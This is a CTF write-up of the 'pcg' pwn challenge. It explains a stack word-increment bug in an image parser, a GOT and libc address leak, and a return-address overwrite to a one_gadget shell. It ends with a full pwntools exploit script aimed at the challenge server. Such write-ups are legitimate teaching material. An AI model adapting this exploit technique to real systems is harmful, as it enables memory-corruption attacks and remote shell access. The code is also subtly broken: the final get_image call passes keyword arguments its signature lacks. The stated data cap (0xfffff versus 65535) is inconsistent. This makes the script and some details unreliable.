---
layout: page
title: "pingctf-pcg"
permalink: /ctf/pingctf/pcg

---

Me and my friends decided we should give the ctf a try, in the pwn section, we will look at pcg,

Even though we didn't manage to solve it in time, I managed to solve it post-ctf :]

# General info
The purpose of the binary is to act as a new terminal based image (or basic encoding of a image - at least) encoding scheme.

The binary allows us to load an image (raw bytes), view the loaded image, view metadata of the loaded image and exit.

The zipcontained two binaries: pcg and libc.so.6
[98e4368427366d6cb34fcec3f0e96c71.zip](https://github.com/0xAriana/blog/files/10282530/98e4368427366d6cb34fcec3f0e96c71.zip)

<img src="https://user-images.githubusercontent.com/121199478/209008928-204194be-1f33-4b76-b101-6dad2d253e00.png" width="400" height="400"/>


# Checksec
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

# Vulnerability
When a image is loaded, you can view it's metadata, one of the metadata that is being printed, is the number of occourances of each color withing the image.
I noted the function that printed those statistics as `show_color_statistics@sub_12F2`, 
this function goes over every byte withing the data, and acts diffrently according to the highest-2-bits.
The authors of this program has made sure to cast correctly every additions of numbers, every indexing of an array, however:
<img src="https://user-images.githubusercontent.com/121199478/209014114-7c8cdbdb-1f13-4e10-8061-f020b0865693.png" width="600" height="250"/>

In the case that the highest-2-bits are both 0, some array element is being incremented, this array happens to be on the stack, and the index to the element is user controlled.
However since the index must have 2 of it's highest bits zeroed out, the highest he can achieve is the 64'th element.
The array is declared as follows:

<img src="https://user-images.githubusercontent.com/121199478/209014623-4fcd47be-13ee-48de-8b69-0c2665cd69b1.png" width="400" height="30"/>

As we can see, this is a word-size array, hence the controlled array index is word size, letting us reach 64 * 2 bytes from the beginning of the array, which is beyond the return address.

# Image struct
The image is constructed of the following struct:

| 13 bytes of header | data | title |

data and title size varies and is specified in the header struct:
![image](https://user-images.githubusercontent.com/121199478/209017571-32e34c15-d8a9-4bf2-9960-12cda3bc1e7b.png)


# Defeating PIE & ASLR
As we got a glimpse for earlier on, PIE is enabled, unless we can we use the word-increasing ability to somehow jump to a winning function by pure-offset (spoiled: we can't), we need a leak.

The leak is located at a function which prints the header details `@sub_18A1`, this function gets the image address (located on the data section), saves it on the stack (**relative to rbp!**)
and uses the local variable to print different offsets of the header:
![image](https://user-images.githubusercontent.com/121199478/209018209-8f6493e5-71f9-4d97-a7fc-fabafb565dcf.png)

So if we jump to 0x18AD, and somehow manage to make `[rbp-8]` point to an intersting place, we can print it.

Jumping to 0x18AD can be done by increasing the least significant word of the return address of `show_color_statistics` (We can get to any word value we want by overflowing it, since our data size is capped by 0xFFFF).

Now, we notice that upon returning, rbp is not pointing to the frame of the caller of `show_color_statistics`, which is noted `show_metadata_of_the_image@sub_1859`.

It turns out (via gdb or static analysis), that `[rbp-8]` of `show_metadata_of_the_image`
<img src="https://user-images.githubusercontent.com/121199478/209019292-91e1a0b2-39c4-4f40-bc29-1535f21e6eb5.png" width="850" height="300"/>

Is actually pointing to the image address!
So, we will use the word-increase for two purposes:
1. Change the return address to point to 0x18AD (@sub_18A1).
2. Modify the `[rbp-8]` of `show_metadata_of_the_image` to point to the got, which since its partial RELRO, located under the data section (overflow is needed).

We wish to print the got becasue we aim to leak the libc base, which we can later on exploit to get a shell (here the got also servers another purpose).

# General image construction
As suggested by the pcg_image_header struct, the header is constructed by the magic:0xFF474350

## Checksum calculation
Not much there is to say about the checksum, the check and calculation are located at `sub@1217`, the checksum excludes the magic and checksum fields.
Here's a python code which calculates the checksum:
```Python
def calc_checksum(image: bytearray):
    checksum = PCG_MAGIC
    counter = 0
    for byte in image[8:]:
        current_byte_to_xor_with = byte << (8 * (counter % 4))
        checksum = checksum ^ current_byte_to_xor_with
        counter += 1
    return checksum
```

# Leak implementation 
The actual data bytes are the word-offset on the stack, and the number of identical bytes in the data is the number of times we increased the value.
Following this principle, we generate the following code, I'll explain the function right after:
```Python
def get_data_to_leak_pcg_bin_address():
    data = bytearray()

    # 0x18AD - 0x1892 => only LSB needs to be modified.
    # 0xAD - 0x92 = 0x1B
    # Overwriting the return address.
    for _ in range(0x1B):
        data += bytes([SHOW_STATISTICS_RET_ADDR_OFFSET])

    # Overwriting the rbp-8 of sub_18A1
    # 0x4018 - 0x40a0 = 0xFF78
    for _ in range(0xFF78):
        data += bytes([RBP_MINUS_8_OFFSET])
    return data
```

## get_data_to_leak_pcg_bin_address explanation
* SHOW_STATISTICS_RET_ADDR_OFFSET is word offset on the stack that the return address we wish to overwrite resides in.
* RBP_MINUS_8_OFFSET is the word offset on the stack that is used to point to the printed header.
* 0x18AD is the desired return addres as stated previously.
* 0x1892 is the return address (RVA) written on the stack.
* 0x4018 is the address of the `putchar@got`
* 0x40a0 is the address of the image header (in the data section).

From debugging, i noticed that putchar was not resolved by this point, hence, the actual content of the got is the address of the plt of putchar.
Leaking us the address of the pcg binary image - hence the name.

## libc leak
I wrote another function (almost identical to get_data_to_leak_pcg_bin_address) to leak an already resolved function, such as puts.

### libc leak output example
![image](https://user-images.githubusercontent.com/121199478/209022512-3e94374b-3a2c-4801-8516-b2f6af95ad98.png)

Concating the magic:checksum we get the address: 0x7f6a3ed4ed0, which is the puts address.

# Obtaining a shell
Running one_gadget we get several possibilities for a shell spawn:

<img src="https://user-images.githubusercontent.com/121199478/209023034-a497cc32-511d-45d6-869a-be60ab824bda.png" width="550" height="380"/>

Since we leaked both pcg address and libc, we can now calculate the diff between the return address of `show_color_statistics` and the one_gadget address.

However there some things we **must** note, our increasing ability is word based, hence, we'll need to increase every word of the return address seperatly, 
such that, at the end of the process, we'll have the one_gadget adderss as our return address.

Remembering that each byte in the image data can only increase a certain offset on the stack **once**, and the data is capped at 0xfffff (65535), if the total number of increasments we need to do exceeds that cap - we can't exploit.

"Luckily" (haha) aslr is turned on, so we might get lucky sometime (sploiler: we do, depending on the one_gadget we chose).

Heres a script that builds the image data that does what we described above:
``` Python
def get_data_to_change_ret_addr_to_execve(show_statistics_ret_addr, execve_bin_sh_addr):
    data = bytearray()

    lowset_word_diff = (((execve_bin_sh_addr & 0xffff) - (show_statistics_ret_addr & 0xffff))) & 0xffff
    second_lowest_word_diff = (((execve_bin_sh_addr & 0xffff0000) >> (8 * 2)) - (
            (show_statistics_ret_addr & 0xffff0000) >> (8 * 2))) & 0xffff
    third_lowest_word_diff = (((execve_bin_sh_addr & 0xffff00000000) >> (8 * 4)) - (
            (show_statistics_ret_addr & 0xffff00000000) >> (8 * 4))) & 0xffff

    # Overwriting the return address.
    for _ in range(lowset_word_diff):
        data += bytes([SHOW_STATISTICS_RET_ADDR_OFFSET])

    # Second address word
    for _ in range(second_lowest_word_diff):
        data += bytes([SHOW_STATISTICS_RET_ADDR_OFFSET + 1])

    # Third address word
    for _ in range(third_lowest_word_diff):
        data += bytes([SHOW_STATISTICS_RET_ADDR_OFFSET + 2])

    return data
```

Running the final exploit we get:
![image](https://user-images.githubusercontent.com/121199478/209024651-d2fff52f-e19b-4747-a130-54af2163a1fb.png)

# Final exploit
Here's the badly written complete exploit:
```Python
import struct

import pwn
from pwnlib.context import context

pwntools_send_size = 100

PCG_MAGIC = 0xFF474350
show_statistics_ret_rva = 0x1892
RBP_SIZE = 0x8
SHOW_STATISTICS_RET_ADDR_OFFSET = 0x10 + ((
                                                  0x40 - 0x30) + RBP_SIZE) // 2
RBP_MINUS_8_OFFSET = SHOW_STATISTICS_RET_ADDR_OFFSET + 0x8


def get_header(checksum, width, height, title_len, data_len):
    return struct.pack("<II3cH", PCG_MAGIC, checksum, bytes([width]), bytes([height]), bytes([title_len]), data_len)


def calc_checksum(image: bytearray):
    checksum = PCG_MAGIC
    counter = 0
    for byte in image[8:]:
        current_byte_to_xor_with = byte << (8 * (counter % 4))
        checksum = checksum ^ current_byte_to_xor_with
        counter += 1
    return checksum


def get_data_to_leak_pcg_bin_address():
    data = bytearray()

    # 0x18AD - 0x1892 => only LSB needs to be modified.
    # 0xAD - 0x92 = 0x1B
    # Overwriting the return address.
    for _ in range(0x1B):
        data += bytes([SHOW_STATISTICS_RET_ADDR_OFFSET])

    # Overwriting the rbp-8 of sub_18A1
    # 0x4018 - 0x40a0 = 0xFF78
    for _ in range(0xFF78):
        data += bytes([RBP_MINUS_8_OFFSET])
    return data


def get_data_to_leak_libc():
    data = bytearray()

    # 0x18AD - 0x1892 => only LSB needs to be modified.
    # 0xAD - 0x92 = 0x1B
    # Overwriting the return address.
    for _ in range(0x1B):
        data += bytes([SHOW_STATISTICS_RET_ADDR_OFFSET])

    # Overwriting the rbp-8 of sub_18A1
    # 0x4028 - 0x40a0 = 0xFF88
    for _ in range(0xFF88):
        data += bytes([RBP_MINUS_8_OFFSET])
    return data


def get_data_to_change_ret_addr_to_execve(show_statistics_ret_addr, execve_bin_sh_addr):
    data = bytearray()

    lowset_word_diff = (((execve_bin_sh_addr & 0xffff) - (show_statistics_ret_addr & 0xffff))) & 0xffff
    second_lowest_word_diff = (((execve_bin_sh_addr & 0xffff0000) >> (8 * 2)) - (
            (show_statistics_ret_addr & 0xffff0000) >> (8 * 2))) & 0xffff
    third_lowest_word_diff = (((execve_bin_sh_addr & 0xffff00000000) >> (8 * 4)) - (
            (show_statistics_ret_addr & 0xffff00000000) >> (8 * 4))) & 0xffff

    # Overwriting the return address.
    for _ in range(lowset_word_diff):
        data += bytes([SHOW_STATISTICS_RET_ADDR_OFFSET])

    # Second address word
    for _ in range(second_lowest_word_diff):
        data += bytes([SHOW_STATISTICS_RET_ADDR_OFFSET + 1])

    # Third address word
    for _ in range(third_lowest_word_diff):
        data += bytes([SHOW_STATISTICS_RET_ADDR_OFFSET + 2])

    return data


def get_image(leak_libc=False, final_exploit=False, show_statistics_ret_addr=None, execve_bin_sh_addr=None):
    width = 0
    height = 0
    title_len = 0

    data = get_data_to_leak_pcg_bin_address()
    if leak_libc:
        data = get_data_to_leak_libc()

    if final_exploit:
        data = get_data_to_change_ret_addr_to_execve(show_statistics_ret_addr, execve_bin_sh_addr)

    data_len = len(data)
    header = get_header(0, width, height, title_len, data_len)  # Checksum will be modified later.
    checksum = calc_checksum(header + data)

    header = get_header(checksum, width, height, title_len, data_len)
    return header + data


def check_total_diff(base_bin_addr, libc_addr):
    total_diff = 0
    total_diff += (((libc_addr & 0xffff) - (base_bin_addr & 0xffff))) & 0xffff
    total_diff += (((libc_addr & 0xffff0000) >> (8 * 2)) - ((base_bin_addr & 0xffff0000) >> (8 * 2))) & 0xffff
    total_diff += (((libc_addr & 0xffff00000000) >> (8 * 4)) - ((base_bin_addr & 0xffff00000000) >> (8 * 4))) & 0xffff
    return total_diff <= 0xffff


def main():
    context.log_level = "debug"
    io_gdb = pwn.remote("pcg.ctf.knping.pl", 30001)

    io_gdb.recvuntil(">>".encode("ASCII"))
    io_gdb.sendline("3".encode("ASCII"))
    io_gdb.recvuntil(">>".encode("ASCII"))

    # Leak libc puts addr.
    image = get_image(leak_libc=True)

    for idx in range(len(image) // pwntools_send_size + 1):
        io_gdb.send(image[pwntools_send_size * idx:(idx + 1) * pwntools_send_size])

    io_gdb.sendline()
    io_gdb.recvuntil(">>".encode("ASCII"))

    io_gdb.sendline("2")
    io_gdb.recvuntil("HEADER END".encode("ASCII"))
    io_gdb.recvuntil("magic: ".encode("ASCII"))

    four_bytes_LSB = io_gdb.recvn(8)

    io_gdb.recvuntil("checksum: ".encode("ASCII"))
    two_bytes_MSB = io_gdb.recvn(4)

    puts_addr_hex_str = two_bytes_MSB + four_bytes_LSB
    puts_addr = int(puts_addr_hex_str, 16)

    io_gdb.recvuntil(">>".encode("ASCII"))
    io_gdb.sendline("3".encode("ASCII"))
    io_gdb.recvuntil(">>".encode("ASCII"))

    # Leak base image <putchar@plt>+6 addr.
    image = get_image(leak_libc=False)

    for idx in range(len(image) // pwntools_send_size + 1):
        io_gdb.send(image[pwntools_send_size * idx:(idx + 1) * pwntools_send_size])

    io_gdb.sendline()
    io_gdb.recvuntil(">>".encode("ASCII"))

    io_gdb.sendline("2")
    io_gdb.recvuntil("HEADER END".encode("ASCII"))
    io_gdb.recvuntil("magic: ".encode("ASCII"))

    four_bytes_LSB = io_gdb.recvn(8)

    io_gdb.recvuntil("checksum: ".encode("ASCII"))
    two_bytes_MSB = io_gdb.recvn(4)

    putchar_plt_plus_6_hex_str = two_bytes_MSB + four_bytes_LSB
    putchar_plt_plus_6_addr = int(putchar_plt_plus_6_hex_str, 16)

    puts_rva = 0x80ED0
    libc_image_base = puts_addr - puts_rva
    execve_bin_sh_rva = 0x50a37
    execve_bin_sh_addr = libc_image_base + execve_bin_sh_rva

    putchar_plt_plus_6_rva = 0x1036
    pcg_image_base = putchar_plt_plus_6_addr - putchar_plt_plus_6_rva
    show_statistics_ret_addr = pcg_image_base + show_statistics_ret_rva

    is_exploitable = check_total_diff(show_statistics_ret_addr, execve_bin_sh_addr)

    if is_exploitable:
        io_gdb.recvuntil(">>".encode("ASCII"))
        io_gdb.sendline("3".encode("ASCII"))
        io_gdb.recvuntil(">>".encode("ASCII"))

        image = get_image(final_exploit=True, base_bin_addr=show_statistics_ret_addr, libc_addr=execve_bin_sh_addr)

        for idx in range(len(image) // pwntools_send_size + 1):
            io_gdb.send(image[pwntools_send_size * idx:(idx + 1) * pwntools_send_size])

        io_gdb.sendline()
        io_gdb.recvuntil(">>".encode("ASCII"))

        io_gdb.sendline("2")

        io_gdb.interactive()

main()

```

